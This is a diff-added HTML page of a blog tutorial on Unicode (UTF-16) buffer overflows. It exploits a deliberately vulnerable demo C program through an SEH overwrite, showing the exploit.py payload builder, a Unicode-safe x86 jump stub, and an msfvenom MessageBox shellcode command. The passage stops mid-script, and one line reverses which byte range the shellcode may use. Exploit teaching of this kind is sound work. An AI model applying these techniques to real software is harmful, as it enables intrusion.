@@ -1,0 +1,376 @@
+<!DOCTYPE html><html lang="en-us" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[Learning] Unicode Overflow | ISSAC/iss4cf0ng's blog</title><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="[Learning] Unicode Overflow | ISSAC/iss4cf0ng's blog"><meta name="twitter:image" content="https://iss4cf0ng.github.io/images/meme/Wallpaper/MyArt/5.png"><meta property="og:title" content="[Learning] Unicode Overflow"><meta property="og:image" content="https://iss4cf0ng.github.io/images/meme/Wallpaper/MyArt/5.png"><meta property="og:url" content="https://iss4cf0ng.github.io/2026/09/15/2026-9-15-Unicode-BoF/index.html"><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":true,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
+ menuSettings: {
+   zoom: "None"
+ },
+ showMathMenu: false,
+ jax: ["input/TeX","output/CommonHTML"],
+ extensions: ["tex2jax.js"],
+ TeX: {
+   extensions: ["AMSmath.js","AMSsymbols.js"],
+   equationNumbers: {
+     autoNumber: "AMS"
+   }
+ },
+ tex2jax: {
+   inlineMath: [["\\(", "\\)"]],
+   displayMath: [["\\[", "\\]"]]
+ }
+});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-RQ7HTMYT8W"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-RQ7HTMYT8W');</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ISSAC/iss4cf0ng's blog" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/About/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/Alien/"><span class="navItemTitle">Alien</span></a></li><li class="navItem"><a class="navBlock" href="/Arsenal/"><span class="navItemTitle">Arsenal</span></a></li><li class="navItem"><a class="navBlock" href="/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"><span class="navItemTitle">DuplexSpy</span></a></li><li class="navItem"><a class="navBlock" href="/Notes/"><span class="navItemTitle">Notes</span></a></li><li class="navItem"><a class="navBlock" href="/Series/"><span class="navItemTitle">Series</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[Learning] Unicode Overflow</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2026-09-15T05:27:33.000Z" id="date"> 2026-09-15</time></div></span><br><span>Last Update: <div class="control"><time datetime="2026-09-15T06:42:04.556Z" id="updated"> 2026-09-15</time></div></span><br><span>Word Count: <div class="control">2.7k</div></span><br><span>Read Time: <div class="control">17 min</div></span></div></div><hr><div id="post-content"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of my series: <strong><a href="/FromBugToExploit">From Bug To Exploit</a></strong>.</p>
+<p>In this article, I will introduce the principle of Unicode overflow.</p>
+<p align="center" class='item-img' data-src='/images/meme/Rio/7.png'><img src="/images/meme/Rio/7.png" width=250/>
+</p>
+
+<blockquote>
+<p>Murmur: While studying this technique with my textbook, I was struggling with the “standard answer” (somed details were not very clear). I then gave up reading the book and finally understood the workflow of Unicode overflow!</p>
+</blockquote>
+<h1 id="Unicode-Overflow"><a href="#Unicode-Overflow" class="headerlink" title="Unicode Overflow"></a>Unicode Overflow</h1><p><strong>Unicode overflow</strong> is a specific type of buffer overflow vulnerability that occurs during string conversion or manipulation involving wide characters (such as <strong>UTF-16</strong>) or multi-byte character sets.</p>
+<blockquote>
+<p>Murmur: I assume my readers are skilled in programming (are you?). Therefore, I will not introduce how important Unicode is…</p>
+</blockquote>
+<p align="center" class='item-img' data-src='/images/meme/Rio/3.png'><img src="/images/meme/Rio/3.png" width=250/>
+</p>
+
+<p>The most special feature of Unicode overflow is that the data in a buffer will be converted from ASCII to Unicode.</p>
+<p>Usually, a Unicode system uses two bytes to store a letter, while ASCII only uses one. As a result, data that was originally only one byte will become two bytes. For example, the letter <code>\x41</code> will become <code>\x00\x41</code> (padding with a null byte).</p>
+<p>In addition, for compatibility reasons, when ASCII-encoded data is converted to Unicode, data from <code>\x00</code> to <code>\x7F</code> remains unchanged, but with a padding <code>\x00</code> at the beginning of them. Only the data <code>\x80</code> to <code>\xFF</code> change.</p>
+<p>This raises a problem: the final result of converting data from <code>\x80</code> to <code>\xFF</code> depends on the operating system and the application. In other words, they are <strong>unpredictable</strong>, and shouldn’t be, since we cannot know the remote encoding system when performing an attack. Therefore, our shellcode can only be developed using data from <code>\x80</code> to <code>\xFF</code>, without any bad characters.</p>
+<p align="center" class='item-img' data-src='/images/meme/rio_crying.jpg'><img src="/images/meme/rio_crying.jpg" width=250/>
+</p>
+
+<p>Another issue is that the original shellcode thatt worked in the previous articles will not work as well. For example, we used <code>0x41414141</code> to overwrite <code>EIP</code>. In Unicode overflow, however, the final value of <code>EIP</code> is <code>0x00410041</code>, which directly affects overwriting the address of <code>RET</code> or <code>SEH</code>.</p>
+<p>What’s more, we used instructions like <code>jmp esp</code> to redirect the execution flow to the stack. In Unicode overflow, however, we can only use addresses in the form of <code>00mm00nn</code>. If we cannot find any address in this form, then we have to check whether there are any nearby addresses available that will not affect the execution of <code>jmp esp</code>.</p>
+<p align="center" class='item-img' data-src='/images/meme/nagusa_crying.jpg'><img src="/images/meme/nagusa_crying.jpg" width=250/>
+</p>
+
+<p>As we can see, a Unicode environment significantly increases the difficulty of performing a remote code execution. Therefore, performing a Unicode overflow is much more difficult than the previous techniques.</p>
+<blockquote>
+<p>Note: Of course, it makes no difference if you just want to cause a Denial-of-Service.</p>
+</blockquote>
+<p>In modern systems, it is rare that we can perform a Unicode overflow. However, it really helps us understand how assembly and Unicode work, as the demand for understanding NASM and memory layout is higher than with the previous techniques. In addition, the next topic, MS08-067, is also about Unicode.</p>
+<h1 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h1><p>In this section, I will perform a Unicode overflow with a vulnerable demo application.</p>
+<p>Compile the program below in Dev-C++:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// vulnerable_ex.c</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-type">char</span>* <span class="hljs-type">const</span> here = (<span class="hljs-type">char</span>*)<span class="hljs-number">0x00400060</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">void</span> *src_buffer, <span class="hljs-type">size_t</span> <span class="hljs-type">const</span> len)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> <span class="hljs-type">const</span> BUF_LENGTH = <span class="hljs-number">128</span>;<br>    <span class="hljs-type">char</span> bad_buffer[BUF_LENGTH];<br><br>    <span class="hljs-built_in">memcpy</span>(bad_buffer, src_buffer, len * <span class="hljs-number">2</span>); <span class="hljs-comment">// bad usage</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    DWORD oldProtect;<br>    VirtualProtect((LPVOID)<span class="hljs-number">0x00400000</span>, <span class="hljs-number">0x1000</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br><br>    <span class="hljs-built_in">memcpy</span>(here, <span class="hljs-string">&quot;\x90\x58\x58\xc3&quot;</span>, <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\&quot;here\&quot; address is at: 0x%p\n&quot;</span>, (<span class="hljs-type">void</span>*)here); <br><br>    <span class="hljs-type">size_t</span> <span class="hljs-type">const</span> STR_LENGTH = <span class="hljs-number">4096</span>;<br>    <span class="hljs-type">wchar_t</span> *unicode_buffer = (<span class="hljs-type">wchar_t</span> *)<span class="hljs-built_in">malloc</span>(STR_LENGTH);<br>    <span class="hljs-type">char</span> ascii_buffer[STR_LENGTH];<br>    FILE* pfile;<br>    <span class="hljs-type">int</span> rt;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Starts...\n&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (argc &gt;= <span class="hljs-number">2</span>)<br>    &#123;<br>        pfile = fopen(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-built_in">fscanf</span>(pfile, <span class="hljs-string">&quot;%s&quot;</span>, ascii_buffer);<br>        rt = MultiByteToWideChar(CP_UTF7, <span class="hljs-number">0</span>, ascii_buffer, <span class="hljs-number">-1</span>, unicode_buffer, STR_LENGTH);<br>        <span class="hljs-keyword">if</span> (rt == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br><br>        foo(unicode_buffer, rt * <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ends...\n&quot;</span>);<br><br>    <span class="hljs-built_in">free</span>(unicode_buffer);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Here, I modified the original example from my textbook to fit this case, as the address of <code>here</code> may not match the requirements for performing a Unicode overflow. After compiling, the address is located at <code>0x00400060</code>.</p>
+<p>Now, let’s try to crash the application:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exploit.py</span><br><br><span class="hljs-keyword">import</span> argparse<br><br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&#x27;--dos&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;--poc&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;--exploit&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>args = parser.parse_args()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_dos</span>():<br>    junk = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">3000</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exploit.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(junk)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_poc</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_exploit</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> args.dos:<br>        do_dos()<br>    <span class="hljs-keyword">elif</span> args.poc:<br>        do_poc()<br>    <span class="hljs-keyword">elif</span> args.exploit:<br>        do_exploit()<br>    <span class="hljs-keyword">else</span>:<br>        parser.print_help()<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] File has been built&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/1.png'><img src="/images/article/2026-9-15-Unicode-BoF/1.png" width=600/>
+</p>
+
+<p>After opening it with <strong>Immunity Debugger</strong>, the program crashes. We can see that the values of <code>SEH</code> and <code>NSEH</code> have been overwritten. As I mentioned before, the value <code>0x41414141</code> becomes <code>0x00410041</code>.</p>
+<p>Next, we need to find the exact offset:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/2.png'><img src="/images/article/2026-9-15-Unicode-BoF/2.png" width=800/>
+</p>
+
+<p>After overwriting <code>SEH</code> and <code>NSEH</code> again, note that the values here cannot be used directly since they contain <code>\x00</code> padding. In this case, right-click the first handler and click “Follow address in stack”:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/3.png'><img src="/images/article/2026-9-15-Unicode-BoF/3.png" width=600/>
+</p>
+
+<p>As shown in the stack window, our data first overwrote <code>NSEH</code> and then <code>SEH</code>. Since the addresses use little-endian byte order, the data used to overwrite the two fields is <code>0x3000430079003100</code>. After removing the <code>\x00</code> bytes, we get <code>0x30437931</code>.</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/4.png'><img src="/images/article/2026-9-15-Unicode-BoF/4.png" width=600/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/5.png'><img src="/images/article/2026-9-15-Unicode-BoF/5.png" width=800/>
+</p>
+
+<p>Then, we can modify the exploit script as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exploit.py</span><br><br><span class="hljs-keyword">import</span> argparse<br><br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&#x27;--dos&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;--poc&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;--exploit&#x27;</span>, action=<span class="hljs-string">&#x27;store_true&#x27;</span>)<br>args = parser.parse_args()<br><br>OFFSET_NEXT = <span class="hljs-number">2282</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_dos</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_poc</span>():<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exploit.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        junk = OFFSET_NEXT * <span class="hljs-string">b&#x27;A&#x27;</span><br>        next_val = <span class="hljs-string">b&#x27;BB&#x27;</span><br><br>        handler = <span class="hljs-string">b&#x27;\x60\x40&#x27;</span><br><br>        more_junk = <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">1000</span><br><br>        buffer = junk + next_val + handler + more_junk<br><br>        f.write(buffer)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_exploit</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> args.dos:<br>        do_dos()<br>    <span class="hljs-keyword">elif</span> args.poc:<br>        do_poc()<br>    <span class="hljs-keyword">elif</span> args.exploit:<br>        do_exploit()<br>    <span class="hljs-keyword">else</span>:<br>        parser.print_help()<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] File has been built&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/10.png'><img src="/images/article/2026-9-15-Unicode-BoF/10.png" width=600/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/11.png'><img src="/images/article/2026-9-15-Unicode-BoF/11.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/12.png'><img src="/images/article/2026-9-15-Unicode-BoF/12.png" width=800/>
+</p>
+
+<p>After executing <code>RETN</code>, we have successfully jumped to a bunch of <code>\x42</code>, which is the <code>more_junk</code> we used in the script.</p>
+<p>However, we don’t have enough space to store our shellcode. Therefore, this small space can be used for another piece of shellcode to perform a second jump.</p>
+<p>How about the final payload used to prompt a <code>MessageBox</code>? We can put it into the junk filled with <code>\x41</code>:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/13.png'><img src="/images/article/2026-9-15-Unicode-BoF/13.png" width=800/>
+</p>
+
+<p>How can we jump onto this junk data? We just need to use the characteristics of <code>popad</code> and <code>ret</code>. If we execute <code>popad</code>, the register <code>EAX</code> will be loaded with the value from the first slot of the stack. Therefore, we can modify the value of <code>EAX</code>, execute <code>PUSH EAX</code> and <code>RET</code>, and eventually jump onto the junk data.</p>
+<p>Therefore, we can implemented our second jump code like this:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[<span class="hljs-meta">BITS</span> <span class="hljs-number">32</span>]<br><br><span class="hljs-keyword">popad</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x11001500</span><br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x11001100</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+<p>After compiling, the the opcode looks like this:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/19.png'><img src="/images/article/2026-9-15-Unicode-BoF/19.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/6.png'><img src="/images/article/2026-9-15-Unicode-BoF/6.png" width=600/>
+    <figcaption>
+    Corrupted
+    </figcaption>
+</p>
+
+<blockquote>
+<p>Note: Since the application appends <code>\x00</code> bytes, we have to develop code that can be executed even when <code>\x00</code> bytes are appended, and then remove all <code>\x00</code> from our final payload.</p>
+</blockquote>
+<p>But we still have a problem. As I mentioned before, our shellcode needs to be in the form of <code>00mm00nn</code>. Therefore, we need to append instructions that do not affect the execution flow, such as <code>00 72 00</code> (<code>add [byte edx + 0], dh</code>), to our shellcode.</p>
+<p>Therefore, the final jump code can be implemented as follows:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[<span class="hljs-meta">BITS</span> <span class="hljs-number">32</span>]<br><br><span class="hljs-keyword">popad</span><br><span class="hljs-keyword">add</span> [<span class="hljs-built_in">byte</span> <span class="hljs-built_in">edx</span> + <span class="hljs-number">0</span>], <span class="hljs-number">dh</span><br><span class="hljs-keyword">add</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x11001500</span><br><span class="hljs-keyword">add</span> [<span class="hljs-built_in">byte</span> <span class="hljs-built_in">edx</span> + <span class="hljs-number">0</span>], <span class="hljs-number">dh</span><br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x11001100</span><br><span class="hljs-keyword">add</span> [<span class="hljs-built_in">byte</span> <span class="hljs-built_in">edx</span> + <span class="hljs-number">0</span>], <span class="hljs-number">dh</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-keyword">add</span> [<span class="hljs-built_in">byte</span> <span class="hljs-built_in">edx</span> + <span class="hljs-number">0</span>], <span class="hljs-number">dh</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/20.png'><img src="/images/article/2026-9-15-Unicode-BoF/20.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/14.png'><img src="/images/article/2026-9-15-Unicode-BoF/14.png" width=800/>
+</p>
+
+<p>Here are some useful opcodes, so we don’t have to completely understand how our CPUs process the binary:</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Opcode</th>
+<th>Instruction</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>007100</code></td>
+<td><code>add [ecx], dh</code></td>
+</tr>
+<tr>
+<td><code>007200</code></td>
+<td><code>add [edx], dh</code></td>
+</tr>
+<tr>
+<td><code>007300</code></td>
+<td><code>add [ebx], dh</code></td>
+</tr>
+<tr>
+<td><code>0500QQ00PP</code></td>
+<td><code>add eax, 0xPP00QQ00</code></td>
+</tr>
+<tr>
+<td><code>2D00QQ00PP</code></td>
+<td><code>sub eax, 0xPP00QQ00</code></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Finally, we can build the main payload using <code>msfvenom</code>. Again, the same problem arises: our shellcode has to be in the form of <code>00mm00nn</code>. In the past, people could use tools such as <code>alpha2</code> to generate shellcode compatible with Unicode overflow. Fortunately, modern <code>msfvenom</code> has <code>alpha2</code> built in and can generate shellcode for Unicode overflow!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -l encoders | grep <span class="hljs-string">&quot;alpha&quot;</span><br>msfvenom -l encoders | grep <span class="hljs-string">&quot;unicode&quot;</span><br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/21.png'><img src="/images/article/2026-9-15-Unicode-BoF/21.png" width=800/>
+</p>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/messagebox TEXT=<span class="hljs-string">&quot;hello&quot;</span> -a x86 --platform windows -e x86/unicode_upper BufferRegister=EAX -f python -v shellcode<br></code></pre></td></tr></table></figure>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/22.png'><img src="/images/article/2026-9-15-Unicode-BoF/22.png" width=800/>
+</p>
+
+<blockquote>
+<p>Note: <code>BufferRegister</code> is a parameter for <code>x86/unicode_upper</code>, just like <code>TEXT</code> for <code>windows/messagebox</code>.</p>
+</blockquote>
+<p>Lastly, how do we know where to fit our shellcode? We just need to debug our application once again:</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/17.png'><img src="/images/article/2026-9-15-Unicode-BoF/17.png" width=800/>
+</p>
+
+<p>After executing the second jump code, it is located at <code>0x0022EEF8</code>. Since our large amout of junk data starts at <code>0x22EE0D</code>, the offset is <code>0x22EEF8</code> minus <code>0x22EE0D</code>, which is <code>0xEC</code> (<code>236</code> in decimal).</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-15-Unicode-BoF/15.png'><img src="/images/article/2026-9-15-Unicode-BoF/15.png" width=800/>
+</p>
+
+<p>Since the application uses Unicode, each character takes up 2 byte. Therefore, the offset (the size of the junk data) is <code>236</code> divided by <code>2</code>, which is <code>118</code> in decimal.</p>
+<p>Therefore, our completed exploit script can be implemented as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 